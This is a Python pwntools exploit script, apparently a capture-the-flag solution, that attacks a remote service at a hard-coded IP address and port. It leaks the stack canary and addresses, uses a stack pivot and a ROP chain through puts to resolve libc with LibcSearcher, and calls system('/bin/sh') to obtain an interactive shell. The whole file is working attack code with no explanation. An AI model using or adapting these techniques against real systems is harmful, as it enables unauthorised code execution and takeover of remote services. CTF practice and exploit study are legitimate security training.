from pwn import *
from LibcSearcher import LibcSearcher
p=remote('123.57.69.203',7020)
p.recvuntil('Hello CTFer! Welcome to the world of pwn~\n')
elf=ELF('./attachment-10')
for i in range(216):
    p.sendline(b'123')
p.sendline(b'65')

p.send(b'c')
p.recvuntil(b'A')
result=p.recv()
canary=u64(result[:7].ljust(8,b'\x00'))*16*16
ebp=u64(result[7:13].ljust(8,b'\x00'))
print(hex(ebp))

print(hex(canary))
p.send(b'0'*(0xe0-8)+p64(canary)+b'c'*8+p8(0x98))
#第二次main

for i in range(231):
    p.sendline(b'123')
p.sendline(b'65')
p.recvuntil(b'A')

main=u64(p.recv(6).ljust(8,b'\x00'))-24
elf_base=main-0x128F
init=elf_base+0x1298
put_got=elf_base+elf.got['puts']
put_plt=elf_base+elf.plt['puts']
pop_rdi=elf_base+0x130b
leave=elf_base+0x124A
ret=elf_base+0x1016

init_1=elf_base+0x1250
fun=elf_base+0x1185

print(hex(put_plt))

payload=b'/bin/sh\x00'+p64(pop_rdi)+p64(put_got)+p64(put_plt)+p64(main)
p.send(payload.ljust(0xe0-8,b'\x00')+p64(canary)+p64(ebp-0xf0)+p64(leave))

#获取libc
puts_addr=u64(p.recv(6).ljust(8,b'\x00'))
libc=LibcSearcher('puts',puts_addr)
base=puts_addr-libc.dump('puts')
print(hex(puts_addr))
print(hex(base))
system=base+libc.dump('system')


#第三次main

for i in range(231):
    p.sendline(b'123')
# gdb.attach(p)
p.sendline(b'65')
p.recvuntil(b'A')
payload=p64(ret)+p64(ret)+p64(pop_rdi)+p64(ebp-0xd0)+p64(system)
p.send(payload.ljust(0xe0-8,b'\x00')+p64(canary)+p64(ebp-0xf0-0xd8)+p64(leave))

p.interactive()